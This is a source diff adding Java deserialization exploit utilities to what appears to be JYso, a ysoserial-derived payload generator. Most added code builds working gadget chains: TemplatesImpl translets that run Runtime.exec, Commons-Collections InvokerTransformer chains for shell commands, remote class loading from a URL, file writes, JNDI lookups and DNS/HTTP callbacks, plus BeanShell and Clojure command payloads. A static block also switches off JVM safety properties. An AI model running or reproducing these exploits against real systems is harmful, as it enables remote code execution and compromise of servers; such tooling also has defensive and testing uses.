@@ -1,40 +1,211 @@
 package com.qi4l.JYso.gadgets.utils;
 
 import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.CannotCompileException;
+import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.logging.log4j.Logger;
 import org.apache.logging.log4j.LogManager;
 
+import javax.script.ScriptEngineManager;
 import java.io.*;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.util.*;
 import java.util.Random;
 import java.util.zip.Deflater;
 import java.util.zip.GZIPOutputStream;
-
-import java.io.InputStream;
-import java.lang.reflect.*;
-import java.util.*;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
 import static com.qi4l.JYso.gadgets.utils.Gadgets.createMemoizedInvocationHandler;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertMethod;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
+import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.generateClass;
 import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 @SuppressWarnings({"unused"})
 public class Utils {
+
     private static final Logger log = LogManager.getLogger(Utils.class);
+
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+
+    static {
+        System.setProperty(DESERIALIZE_TRANSLET, "true");
+        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+    }
+
+    public static int getSubarrayIndex(byte[] haystack, byte[] needle) {
+        outer:
+        for (int i = 0; i <= haystack.length - needle.length; ++i) {
+            for (int j = 0; j < needle.length; ++j) {
+                if (haystack[i + j] != needle[j]) {
+                    continue outer;
+                }
+            }
+            return i;
+        }
+
+        return -1;
+    }
+
+    public static byte[] deleteAt(byte[] bs, int index) {
+        int length = bs.length - 1;
+        byte[] ret = new byte[length];
+
+        if (index == bs.length - 1) {
+            System.arraycopy(bs, 0, ret, 0, length);
+        } else if (index < bs.length - 1) {
+            for (int i = index; i < length; i++) {
+                bs[i] = bs[i + 1];
+            }
+
+            System.arraycopy(bs, 0, ret, 0, length);
+        }
+
+        return ret;
+    }
+
+    public static String join(Iterable<String> strings, String sep, String prefix, String suffix) {
+        final StringBuilder sb = new StringBuilder();
+        boolean first = true;
+        for (String s : strings) {
+            if (!first) sb.append(sep);
+            if (prefix != null) sb.append(prefix);
+            sb.append(s);
+            if (suffix != null) sb.append(suffix);
+            first = false;
+        }
+        return sb.toString();
+    }
+
+    public static String repeat(String str, int num) {
+        final String[] strs = new String[num];
+        Arrays.fill(strs, str);
+        return join(Arrays.asList(strs), "", "", "");
+    }
+
+    public static List<String> formatTable(List<String[]> rows) {
+        final Integer[] maxLengths = new Integer[rows.get(0).length];
+        for (String[] row : rows) {
+            if (maxLengths.length != row.length) throw new IllegalStateException("mismatched columns");
+            for (int i = 0; i < maxLengths.length; i++) {
+                if (maxLengths[i] == null || maxLengths[i] < row[i].length()) {
+                    maxLengths[i] = row[i].length();
+                }
+            }
+        }
+
+        final List<String> lines = new LinkedList<>();
+        for (String[] row : rows) {
+            for (int i = 0; i < maxLengths.length; i++) {
+                final String pad = repeat(" ", maxLengths[i] - row[i].length());
+                row[i] = row[i] + pad;
+            }
+            lines.add(join(Arrays.asList(row), " ", "", ""));
+        }
+        return lines;
+    }
+
+    public static class ToStringComparator implements Comparator<Object> {
+
+        public int compare(Object o1, Object o2) {
+            return o1.toString().compareTo(o2.toString());
+        }
+    }
+
+    public static Object createTemplatesImpl(final String[] args) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
+            return createTemplatesImpl(
+                    args,
+                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImpl(args, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+    public static <T> T createTemplatesImpl(final String[] args, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
+            throws Exception {
+        final T templates = tplClass.getDeclaredConstructor().newInstance();
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
+        StringBuilder sb = new StringBuilder();
+        boolean first = true;
+        for (String arg : args) {
+
+            if (!first) {
+                sb.append(',');
+            } else {
+                first = false;
+            }
+
+            sb.append('"');
+            sb.append(arg.replaceAll("\"", "\""));
+            sb.append('"');
+        }
+
+        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(new String[] { " + sb + " });");
+        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
+                classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.getDeclaredConstructor().newInstance());
+        return templates;
+    }
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
+    }
+
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
+    }
 
     public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<>();
         map.put(key, val);
         return map;
     }
+
     public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
@@ -45,7 +216,7 @@ public class Utils {
         if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
-        return iface.cast(Proxy.newProxyInstance(TemplatesUtil.class.getClassLoader(), allIfaces, ih));
+        return iface.cast(Proxy.newProxyInstance(Utils.class.getClassLoader(), allIfaces, ih));
     }
 
     public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
@@ -111,7 +282,6 @@ public class Utils {
     }
 
     public static void saveCtClassToFile(CtClass ctClass) throws Exception {
-        // 总体在进行类字节码的缩短
         shrinkBytes(ctClass);
         byte[] classBytes = ctClass.toBytecode();
     }
@@ -154,7 +324,6 @@ public class Utils {
         gzipOutputStream.close();
 
         String b64 = Base64.encodeBase64String(outBuf.toByteArray());
-        // 如果 b64 的长度比较大，则将其切分为多个字符串进行拼接，避免单个字符串过长
         StringBuilder code = new StringBuilder();
         if (b64.length() > 60000) {
             String[] arrays = splitString(b64, 60000);
@@ -169,7 +338,6 @@ public class Utils {
             code.append("b64=\"").append(b64).append("\";\n");
         }
 
-        // 将赋值的代码插入到 ClassLoaderTemplate 中
         insertMethod(ctClass, "initClassBytes", code.toString());
         return ctClass;
     }
@@ -179,7 +347,6 @@ public class Utils {
         File parentDir = file.getParentFile();
         if (!parentDir.exists()) {
             if (!parentDir.mkdirs()) {
-                // 创建文件夹失败
                 return;
             }
         }
@@ -240,7 +407,6 @@ public class Utils {
         } else {
             bytes = getClassBytes(clazz);
         }
-
 
         return base64Encode(bytes);
     }
@@ -347,5 +513,150 @@ public class Utils {
         }
         compresser.end();
         return output;
+    }
+
+    public static java.security.SignedObject warpWithSignedObject(Serializable obj) throws Exception {
+        java.security.KeyPairGenerator keyPairGenerator;
+        keyPairGenerator = java.security.KeyPairGenerator.getInstance("DSA");
+        keyPairGenerator.initialize(1024);
+        java.security.KeyPair keyPair = keyPairGenerator.genKeyPair();
+        java.security.PrivateKey privateKey = keyPair.getPrivate();
+        java.security.Signature signingEngine = java.security.Signature.getInstance("DSA");
+        return new java.security.SignedObject(obj, privateKey, signingEngine);
+    }
+
+    public static DataOutputStream handshake(DataInputStream in, Socket s) throws IOException {
+        int magic = in.readInt();
+        short version = in.readShort();
+        if (magic != sun.rmi.transport.TransportConstants.Magic || version != sun.rmi.transport.TransportConstants.Version) {
+            s.close();
+            return null;
+        }
+        OutputStream sockOut = s.getOutputStream();
+        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
+        return new DataOutputStream(bufOut);
+    }
+
+    public static byte[] toByteArray(InputStream in) throws IOException {
+        byte[] classBytes;
+        classBytes = new byte[in.available()];
+        int bytesRead = in.read(classBytes);
+        if (bytesRead == -1) {
+            throw new EOFException("流已结束，未读取到数据");
+        }
+        in.close();
+        return classBytes;
+    }
+
+    public static String bytesToHexString(byte[] bArray, int length) {
+        StringBuilder sb = new StringBuilder(length);
+
+        for (int i = 0; i < length; ++i) {
+            String sTemp = Integer.toHexString(255 & bArray[i]);
+            if (sTemp.length() < 2) {
+                sb.append(0);
+            }
+
+            sb.append(sTemp.toUpperCase());
+        }
+        return sb.toString();
+    }
+
+    public static String makeBeanShellPayload(String command) {
+        if (command.startsWith("TS-"))
+            return "compare(Object QI4L, Object QI5L) { return new Integer(1);}java.lang.Thread.sleep(" + (Integer.parseInt(command.split("-")[1]) * 1000) + "L);";
+        if (command.startsWith("RC-")) {
+            String[] strings = handlerCommand(command);
+            return "compare(Object QI4L, Object QI5L) { return new Integer(1);}new URLClassLoader(new URL[]{new URL(\"" + strings[0] + "\")}).loadClass(\"" + strings[1] + "\").newInstance();";
+        }
+        if (command.startsWith("WF-")) {
+            String[] strings = handlerCommand(command);
+            return "compare(Object QI4L, Object QI5L) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getObject());";
+        }
+
+        return "compare(Object QI4L, Object QI5L) {new java.lang.ProcessBuilder(new String[]{" +
+                join(
+                        java.util.Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\"").split(" ")), ",", "\"", "\"") + "}).start();return new Integer(1);}";
+    }
+
+    public static Transformer[] makeTransformer(String command) throws Exception {
+        Transformer[] transformers;
+        String[] execArgs = {command};
+
+        if (command.startsWith("TS-")) {
+            transformers = new Transformer[]{new ConstantTransformer(Thread.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong(command.split("-")[1] + "000")}),};
+        } else if (command.startsWith("RC-")) {
+            String[] strings = handlerCommand(command);
+            transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InstantiateTransformer(new Class[]{URL[].class}, new Object[]{new URL[]{new URL(strings[0])}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{strings[1]}), new InstantiateTransformer(null, null)};
+        } else if (command.startsWith("WF-")) {
+            String[] strings = handlerCommand(command);
+            transformers = new Transformer[]{new ConstantTransformer(java.io.FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{strings[0]}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{base64Decode(strings[1]).getBytes()}), new ConstantTransformer(1)};
+        } else if (command.startsWith("PB-lin")) {
+            transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash", "-c", base64Decode(command.split("-")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
+        } else if (command.startsWith("PB-win")) {
+            transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", base64Decode(command.split("-")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
+        } else if (command.startsWith("SE-")) {
+            transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + base64Decode(command.split("-")[1]) + "');"})};
+        } else if (command.startsWith("DL-")) {
+            transformers = new Transformer[]{new ConstantTransformer(java.net.InetAddress.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getAllByName", new Class[]{String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{command.split("-")[1]}}), new ConstantTransformer(1)};
+        } else if (command.startsWith("HL-")) {
+            transformers = new Transformer[]{new ConstantTransformer(java.net.URL.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{command.split("-")[1]}}), new InvokerTransformer("getContent", new Class[0], new Object[0]), new ConstantTransformer(1)};
+        } else if (command.startsWith("BC-")) {
+            command = command.substring(3);
+            String bcelBytes;
+
+            if (command.startsWith("LF-")) {
+                CtClass ctClass = generateClass(command);
+                bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode());
+            } else {
+                bcelBytes = command;
+            }
+
+            transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
+        } else if (command.startsWith("JD-")) {
+            transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("-")[1]}), new ConstantTransformer(1)};
+        } else if (command.startsWith("LF-")) {
+            CtClass ctClass = generateClass(command);
+
+            if (USING_MOZILLA_DEFININGCLASSLOADER) {
+                transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
+            } else {
+                transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode())})};
+            }
+        } else {
+            transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
+        }
+        return transformers;
+    }
+
+    public static String makeClojurePayload(String command) {
+        if (command.startsWith("TS-"))
+            return "(java.lang.Thread/sleep " + (Integer.parseInt(command.split("-")[1]) * 1000) + ")";
+        if (command.startsWith("RC-")) {
+            String[] strings = handlerCommand(command);
+            return "(def urlStr (new String \"" + strings[0] + "\"))\n(def url (new java.net.URL urlStr))\n(def loader (new java.net.URLClassLoader (into-array [url])))\n(def clazz (.loadClass loader \"" + strings[1] + "\"))\n(.newInstance clazz)";
+        }
+        if (command.startsWith("WF-")) {
+            String[] strings = handlerCommand(command);
+            return "(def path (new String \"" + strings[0] + "\"))\n(def out (new java.io.FileOutputStream path))\n(def byts (.getObject \"" + strings[1] + "\"))\n(.write out byts)";
+        }
+        String cmd = join(java.util.Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");
+        return String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)(println \"QI4L\")", cmd);
+    }
+
+    public static com.qi4l.JYso.gadgets.utils.jre.TCObject makeProxy(Class<?>[] interfaces, com.qi4l.JYso.gadgets.utils.jre.TCObject handler, com.qi4l.JYso.gadgets.utils.jre.Serialization ser) throws Exception {
+        return doMakeProxy(interfaces, handler, ser);
+    }
+
+    private static com.qi4l.JYso.gadgets.utils.jre.TCObject doMakeProxy(Class<?>[] interfaces, Object handler, com.qi4l.JYso.gadgets.utils.jre.Serialization ser) throws Exception {
+        com.qi4l.JYso.gadgets.utils.jre.TCObject proxy = new com.qi4l.JYso.gadgets.utils.jre.TCObject(ser);
+        com.qi4l.JYso.gadgets.utils.jre.TCProxyClassDesc proxyDesc = new com.qi4l.JYso.gadgets.utils.jre.TCProxyClassDesc();
+        for (Class<?> intf : interfaces)
+            proxyDesc.addInterface(intf);
+        com.qi4l.JYso.gadgets.utils.jre.TCClassDesc desc = new com.qi4l.JYso.gadgets.utils.jre.TCClassDesc("java.lang.reflect.Proxy");
+        desc.addField(new com.qi4l.JYso.gadgets.utils.jre.TCClassDesc.Field("h", java.lang.reflect.InvocationHandler.class));
+        proxy.addClassDescData(proxyDesc, new com.qi4l.JYso.gadgets.utils.jre.TCObject.ObjectData());
+        proxy.addClassDescData(desc, (new com.qi4l.JYso.gadgets.utils.jre.TCObject.ObjectData()).addData(handler));
+        return proxy;
     }
 }
